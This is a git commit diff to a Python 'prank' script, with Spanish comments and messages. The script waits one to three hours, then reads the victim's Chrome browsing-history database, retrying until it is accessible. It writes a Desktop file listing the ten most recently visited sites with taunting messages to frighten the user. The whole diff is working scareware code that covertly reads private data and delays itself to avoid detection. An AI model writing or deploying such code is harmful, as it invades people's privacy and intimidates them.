ae05cca2f73608e76900a08d9e8b527c39b5ce02
Riche2000 <ricardosanch2000@gmail.com>
2023-03-09 14:57:15 -0600

    Ver el historial de navegacion

--- HScript/hackerscript.py
+++ HScript/hackerscript.py
@@ -1,11 +1,17 @@
 #Programa broma
 import os
+from pathlib import Path
 from time import sleep
 from random import randrange
 import sqlite3
 
 
 HACKERFILE_NAME = "LEEME.txt"
+
+
+def get_user_path():
+    return "{}/".format(Path.home())
+
 
 def delay_action():
     # Esperaremos entre 1 y 3 horas
@@ -15,24 +21,33 @@ def delay_action():
 
 
 def create_hacker_file(user_path):
-    hacker_file = open(user_path + "Desktop\\" + HACKERFILE_NAME, "w")
-    hacker_file.write("Ya mamaste TAC...")
+    hacker_file = open(user_path + "Desktop/" + HACKERFILE_NAME, "w")
+    hacker_file.write("Ya mamaste TAC...\n")
     return hacker_file
 
 
 def get_chrome_history(user_path):
-    try:
-        history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
-        connection = sqlite3.connect(history_path)
-        cursor = connection.cursor()
-        cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
-        urls = cursor.fetchall()
-        #Cierra la conexion
-        connection.close()
-        return urls
-    #Si el programa peta
-    except sqlite3.OperationalError:
-        return None
+    urls = None
+    while not urls:
+        try:
+            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
+            connection = sqlite3.connect(history_path)
+            cursor = connection.cursor()
+            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
+            urls = cursor.fetchall()
+            #Cierra la conexion
+            connection.close()
+            return urls
+        #Si el programa peta
+        except sqlite3.OperationalError:
+            print("Historial inaccesible, reintentando en 3 segundos...")
+            sleep(3)
+
+
+def check_history_and_scare_user(hacker_file, chrome_history):
+    for item in chrome_history[:10]:
+        hacker_file.write("Ya vi que visitaste {}, ve nomas...\n".format(item[0]))
+
 
 
 def main():
@@ -40,9 +55,11 @@ def main():
     delay_action()
     # w Si el archivo existe o no existe lo sobre escribe o lo crea modo escritura
     # r Requiere que el archivo exista modo lectura
-    user_path = "C:\\Users\\"+os.getlogin()
+    user_path = get_user_path()
     hacker_file = create_hacker_file(user_path)
     chrome_history = get_chrome_history(user_path)
+    # Escribiendo mensajes
+    check_history_and_scare_user(hacker_file, chrome_history)
 
 
 if __name__ == "__main__":
